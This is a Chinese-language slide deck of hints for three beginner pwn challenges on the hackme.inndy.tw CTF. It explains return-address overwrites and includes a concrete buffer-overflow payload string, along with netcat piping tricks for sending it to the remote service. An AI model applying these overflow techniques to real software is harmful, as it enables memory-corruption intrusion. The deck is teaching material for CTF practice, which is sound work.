### 第一次解 
# Pwn
### 就上手

jason3e7 20190820

Note:title:"第一次解 Pwn 就上手"

---

# Pwn
* [catflag](#/2)
* [homework](#/3)
* [toooomuch](#/4)

Note:
* 要怎麼錄過程呢!?
  * `tcpdump host 140.118.126.236 -w output.pcap`
* 怎麼自己架設一樣的環境呢
  * `socat tcp-l:9999,fork exec:./execfile`

---

## catflag hint
* 目標 : get flag
* 方向 : 
  * `nc hackme.inndy.tw 7709`
  * linux command
* [Back to Pwn](#/1)

Note:
* 感覺是寫固定 pattern 的程式.

---

## homework hint
* 目標 : get shell
* 方向 : 
  * index out bound
  * Return Address
* [Back to Pwn](#/1)

Note:
* use tools
  * gdb-peda
  * ida pro, 不一定需要
* 要知道 call function 時候 stack 的變化, 可以 google search `call function stack`.
* step
  * find call_me_maybe(memory), `0x80485fb, 134514171`
    * `disassemble call_me_maybe`
  * find run_program return address(memory), `arr[14]`
    * 連續塞值, 觀察 stack
    * `context stack 24`
  * use write function overwrite run_program return address
* [GDB cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
* [peda_cheatsheet](https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md)

---

## toooomuch hint
* 目標 : pass the game
* 方向 : 
  * play game
  * buffer overflow
* [Back to Pwn](#/1)

Note:
* F5 大絕招知道, passcode
* F5 大絕招知道, 0 ~ 100, 8 次內一定會猜到, 可以直接用猜的.
* buffer overflow
  * s = 18h, 24bytes
  * gdb 測試結果還有疊一個 int, 4 bytes, 看 funtion 開頭也有 sub.
  * print_flag, 0x0804863b.
  * echo -e "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x3b\x86\x04\x08"
    * -e, enable interpretation of backslash escapes
    * -n, do not output the trailing newline
    * [Sending a hex string to a remote via netcat](https://stackoverflow.com/questions/43919867/sending-a-hex-string-to-a-remote-via-netcat)
  * 在自己架的題目可以打的出來, 但是遠端不能, 因為沒有等待.
    * `nc.traditional -nvlp 5566 -e toooomuch`
    * 淯鼎黑科技, `(echo -e "\x00";cat -) | nc IP Port`, 這樣代表什麼意思呢?, 在哪裡看到的呢?, 好像還可以接續操作呢!?
      * `echo -e "\x00";cat - | nc IP Port`, 這樣代表什麼意思呢?
    * `(echo -e "\x00";sleep 3) | nc IP Port`, 這樣也可以.

---

# The End
